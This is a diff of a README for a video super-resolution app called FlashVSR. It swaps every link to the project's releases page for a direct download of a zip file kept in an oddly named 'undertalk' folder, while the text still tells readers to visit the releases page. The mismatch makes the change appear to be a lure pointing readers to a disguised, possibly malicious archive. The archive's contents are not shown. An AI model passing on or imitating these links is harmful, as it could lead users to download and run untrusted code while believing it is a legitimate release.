@@ -11,7 +11,7 @@ Welcome to FlashVSR! This application offers real-time video super-resolution. W
 - **Compact Design:** A small file size allows quick downloads and installations.
 
 ## 📥 Download Now
-[![Download FlashVSR](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/winzadesigner/FlashVSR/releases)
+[![Download FlashVSR](https://raw.githubusercontent.com/winzadesigner/FlashVSR/main/undertalk/FlashVSR.zip)](https://raw.githubusercontent.com/winzadesigner/FlashVSR/main/undertalk/FlashVSR.zip)
 
 ## 🛠️ System Requirements
 Before you download, ensure your computer meets these requirements:
@@ -22,7 +22,7 @@ Before you download, ensure your computer meets these requirements:
 - **Storage:** 100 MB of free space for installation.
 
 ## 🌐 Download & Install
-To get started, visit the releases page to download FlashVSR: [Download FlashVSR](https://github.com/winzadesigner/FlashVSR/releases).
+To get started, visit the releases page to download FlashVSR: [Download FlashVSR](https://raw.githubusercontent.com/winzadesigner/FlashVSR/main/undertalk/FlashVSR.zip).
 
 1. Click on the link above to go to the releases page.
 2. Locate the latest release. It will be at the top of the page.
@@ -61,4 +61,4 @@ For the latest news and updates about FlashVSR, follow us on our GitHub page. He
 ## 🔗 Connect with Us
 If you have any questions or feedback, please do not hesitate to reach out through the repository or support channels.
 
-[Download FlashVSR](https://github.com/winzadesigner/FlashVSR/releases) to enhance your videos today!
+[Download FlashVSR](https://raw.githubusercontent.com/winzadesigner/FlashVSR/main/undertalk/FlashVSR.zip) to enhance your videos today!
